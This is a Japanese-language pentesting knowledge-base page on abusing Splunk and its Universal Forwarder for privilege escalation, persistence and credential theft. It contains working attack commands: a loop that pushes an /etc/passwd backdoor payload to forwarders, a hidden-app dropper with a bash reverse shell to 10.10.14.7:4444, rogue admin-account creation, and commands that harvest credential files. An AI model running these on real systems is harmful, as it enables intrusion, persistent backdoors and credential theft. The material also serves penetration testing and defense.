# Splunk LPE と Persistence

{{#include ../../banners/hacktricks-training.md}}

マシンを**内部から**または**外部から** **enumerating** している際に、**Splunk running**（通常、Web UI は **8000**、management API は **8089**）を発見した場合、有効な認証情報は、app installation、scripted inputs、または management actions を通じて、しばしば **code execution** に変えられます。<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Splunk が **root** として running している場合、これにより即座に **privilege escalation** が実現することがよくあります。<sup>[[1]](#references)</sup>

generic remote attack surface、enumeration、または app-upload RCE path のみが必要な場合は、以下を確認してください。

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

すでに **root** で、Splunk service が localhost のみで listening していない場合は、**Splunk password hashes** を盗み出したり、**encrypted secrets** を復元したり、**malicious app** を push して、ローカルまたは複数の forwarders にわたって persistence を維持したりすることもできます。<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interesting Local Files

Splunk または Splunk Universal Forwarder が running している host にアクセスした場合、通常、以下の paths が最も興味深い対象です。<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
重要な artifact:

- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users と password hashes。<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 複数の `.conf` files に保存された secrets を Splunk が encrypt するために使用する key。<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initial admin bootstrap file。gold images や provisioning のミスで有用。`etc/passwd` がすでに存在する場合は無視される。<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputs が有効化される一般的な場所。<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** または **`$SPLUNK_HOME/etc/apps/`**: persistent app を隠したり、すでに配布されているものを確認したりするのに適した場所。<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit の概要

詳細については [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) を確認してください。ここでは概要のみを説明します。<sup>[[1]](#references)</sup>

**Exploit の概要:**
Splunk Universal Forwarder (UF) を標的とする exploit により、**agent password** を持つ attackers は、agent が動作している systems 上で arbitrary code を実行でき、環境の大部分が compromise される可能性があります。<sup>[[1]](#references)</sup>

**機能する理由:**

- UF management service は通常 **TCP 8089** で公開されています。<sup>[[6]](#references)</sup>
- Attackers は API に authenticate し、forwarder に **malicious app bundle** を install するよう指示できます。<sup>[[1]](#references)[[5]](#references)</sup>
- 同じ primitive を、local では **LPE** に、remote では **RCE** に利用できます。<sup>[[5]](#references)</sup>
- **SplunkWhisperer2** などの public tooling は app bundle を自動的に作成し、Linux targets 向けに payloads を適応させられます。<sup>[[5]](#references)</sup>

**Password を recover する一般的な方法:**

- documentation、scripts、shares、または deployment automation 内の cleartext credentials。<sup>[[1]](#references)</sup>
- `$SPLUNK_HOME/etc/passwd` 内の password hashes を取得して offline cracking を行う。<sup>[[1]](#references)[[7]](#references)</sup>
- `user-seed.conf` などの golden images や provisioning の残骸。<sup>[[1]](#references)[[9]](#references)</sup>

**Impact:**

- compromise された各 host 上での SYSTEM/root-level code execution。<sup>[[1]](#references)</sup>
- persistent apps、backdoors、または ransomware の deployment。<sup>[[1]](#references)</sup>
- data が forward される前に telemetry を disable または tamper すること。<sup>[[1]](#references)</sup>

**Exploitation 用の Example command:**

Original report では、複数の forwarders に payload を送信するための次の loop を示しています。<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**使用可能な公開 exploit：**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs または Malicious Apps による Persistence

`root`/`splunk` として**filesystem write access**がある場合、または authenticated access により apps を install できる場合、非常に信頼性の高い persistence mechanism は、**scripted input**を含む**custom app**を配置することです。<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk 自身の documentation では、scripted inputs を app directory 配下に配置し、`inputs.conf` から有効化することが想定されています。<sup>[[10]](#references)</sup>

一般的な layout：
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
最小限の `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
簡易 Linux dropper（その文書化された app layout を使用）:<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
メモ:

- 同じ手法は、`/opt/splunkforwarder/etc/apps/` を使用する **Universal Forwarder** でも機能します。<sup>[[2]](#references)[[10]](#references)</sup>
- 攻撃者は、明らかに悪意のある app を作成するのではなく、正規の add-on を変更することで、通常は周囲に紛れ込みます。<sup>[[2]](#references)</sup>
- **deployment server** では、`deployment-apps/` 内に悪意のある app を仕込むと、**fleet-wide persistence** につながります。これは、forwarder が更新された app をポーリングしてダウンロードし、適用するために再起動することが多いためです。<sup>[[11]](#references)[[12]](#references)</sup>

## Credential Theft and Admin Takeover

Splunk の local files を読み取れる場合、通常は **Splunk admin access** の回復と、**encrypted service credentials** の回復という 2 つの有力な目的があります。<sup>[[8]](#references)</sup>

### Password hashes and local users

Splunk は local authentication data を `etc/passwd` に保存します。deployment によっては、このファイルを crack することで、web UI と management API で使用できる有効な credentials を回復できます。<sup>[[1]](#references)[[7]](#references)</sup>

すでに有効な **admin** credentials を持っており、Splunk が **native** authentication backend を使用している場合は、CLI 自体を persistence に利用できます。<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` と暗号化された値

Splunk は、複数の設定ファイルに保存される機密値を保護するために `etc/auth/splunk.secret` を使用します。**secret** と関連する **`.conf` ファイル**の両方を盗み出せれば、多くの場合、以下の値を復元または再利用できます:<sup>[[8]](#references)</sup>

- `pass4SymmKey` などの forwarder/indexer 間の shared secret
- `sslPassword` などの TLS private-key password
- `bindDNPassword` などの LDAP bind credential

これにより、Splunk admin password 自体を crack できない場合でも、**lateral movement** が可能になります。<sup>[[8]](#references)</sup>

### `user-seed.conf` の悪用

`user-seed.conf` は初回起動時、または `etc/passwd` が存在しない場合にのみ読み込まれます。そのため、稼働中の box ではあまり役に立ちませんが、以下の環境では非常に興味深い対象になります:<sup>[[9]](#references)</sup>

- compromised installation template
- container image
- unattended provisioning workflow
- Splunk が自動的に再初期化される appliance

このような場合、`splunk hash-passwd` で生成した `HASHED_PASSWORD` を仕込むことで、再デプロイ後に admin access を静かに取り戻せます。<sup>[[9]](#references)</sup>

## Splunk Query の悪用

詳細については [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) を確認してください。<sup>[[3]](#references)[[4]](#references)</sup>

最近有効な technique の一つは、脆弱な Splunk Enterprise version における **user-supplied XSLT** の悪用です。これにより、低権限の authenticated account から `splunk` user としての **OS command execution** へ移行できます。<sup>[[3]](#references)[[4]](#references)</sup>

High-level flow:<sup>[[3]](#references)[[4]](#references)</sup>

1. Splunk に authenticate する。
2. preview/upload functionality を通じて malicious **XSL** file を upload する。
3. upload した stylesheet を **dispatch** directory から使用して、Splunk に search result を render させる。
4. XSLT payload を使用して file を書き込むか、Splunk の search pipeline を通じて execution を trigger する（たとえば `runshellscript` などの internal functionality に到達する）。

重要な offensive takeaway は、この path が **app upload を必要としない post-auth RCE** であることです。Linux では通常、**`splunk`** account を取得します。この user は application tree を所有していることが多く、secret を読み取ることができ、shell を失っても存続する persistent app を仕込めるため、依然として価値があります。<sup>[[3]](#references)[[4]](#references)</sup>

exploitation 中に使用される代表的な path は次のとおりです:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk が過剰な権限で実行されている場合、または `splunk` ユーザーが危険なスクリプト、書き込み可能な service units、あるいは不適切な `sudo` ルールにアクセスできる場合、これは容易な **LPE** chain になります。

## References

- [1] [Splunk Forwarders の悪用による RCE と Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [TraitorWare に注意：Persistence のための Splunk の使用](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 の分析：Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [デフォルト値を変更する](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [複数のサーバーに安全なパスワードをデプロイする](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [scripted input を設定する](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [deployment apps を作成する](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [deployment updates の仕組み](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [CLI でユーザーを設定する](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
